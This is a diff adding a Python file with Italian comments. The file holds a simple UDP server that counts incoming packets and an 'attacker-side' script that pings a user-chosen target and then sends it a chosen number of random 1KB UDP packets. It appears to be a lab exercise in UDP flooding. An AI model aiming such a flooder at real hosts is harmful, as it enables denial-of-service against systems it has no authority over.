@@ -1,0 +1,86 @@
+#CODICE ATTIVAZIONE SERVER UDP:
+	# •	apre una porta UDP specificata
+	# •	ascolta pacchetti in arrivo
+	# •	stampa il contenuto base del pacchetto (senza loggare tutto per evitare overload)
+	# •	tiene conto del numero di pacchetti ricevuti
+	# •	aggiunge timestamp per ogni ricezione
+import socket
+import time
+from datetime import datetime
+
+def start_server():
+    ip = "0.0.0.0"  # ascolta su tutte le interfacce
+    port = int(input("🔌 Inserisci la porta UDP da ascoltare (es. 9999):\n"))
+
+    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    sock.bind((ip, port))
+
+    print(f"\n🛡️  Server UDP in ascolto su {ip}:{port}...\n")
+    packet_counter = 0
+
+    try:
+        while True:
+            data, addr = sock.recvfrom(2048)  # riceve fino a 2KB
+            packet_counter += 1
+            timestamp = datetime.now().strftime("%H:%M:%S.%f")[:-3]
+            print(f"[{timestamp}] 📦 Pacchetto #{packet_counter} da {addr} - {len(data)} byte")
+    except KeyboardInterrupt:
+        print("\n🛑 Server interrotto manualmente.")
+    finally:
+        sock.close()
+
+start_server()
+
+
+
+
+
+###CODICE LATO ATTACCANTE 
+import socket
+import random
+import subprocess
+import platform
+import time
+
+def ping_host(ip):
+    param = "-n" if platform.system().lower() == "windows" else "-c"
+    try:
+        output = subprocess.check_output(["ping", param, "1", ip])
+        return True
+    except subprocess.CalledProcessError:
+        return False
+
+def menu():
+    ip_addr = input("🎯 Inserisci l'IP del bersaglio (es. 127.0.0.1):\n")
+    port = int(input("🔌 Inserisci la porta UDP da colpire (es. 9999):\n"))
+    num_packets = int(input("📦 Quanti pacchetti da 1KB vuoi inviare?\n"))
+
+    print(f"\n🎯 Target: {ip_addr}:{port}")
+    print(f"📦 Pacchetti da inviare: {num_packets}\n")
+ 
+    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+ 
+    if ping_host(ip_addr):
+        print("✅ Host raggiungibile, invio dei pacchetti in corso...\n")
+    else:
+        print("❌ Host NON raggiungibile. Interrompo l'operazione.")
+        return
+
+    start_time = time.time()  # Inizio cronometro
+
+    for i in range(num_packets):
+        data = random.randbytes(1024)
+        try:
+            sock.sendto(data, (ip_addr, port))
+            print(f"➡  Inviato pacchetto #{i+1} ({len(data)} byte)")
+            ritardo = random.uniform(0, 0.1)
+            time.sleep(ritardo)
+            print(f"⏱  Ritardo: {ritardo:.4f} secondi\n")
+        except Exception as e:
+            print(f"❌ Errore nell'invio del pacchetto #{i+1}: {e}")
+
+    end_time = time.time()  # Fine cronometro
+    elapsed = end_time - start_time
+    print(f"\n⏲️  Invio completato in {elapsed:.2f} secondi")
+
+menu()
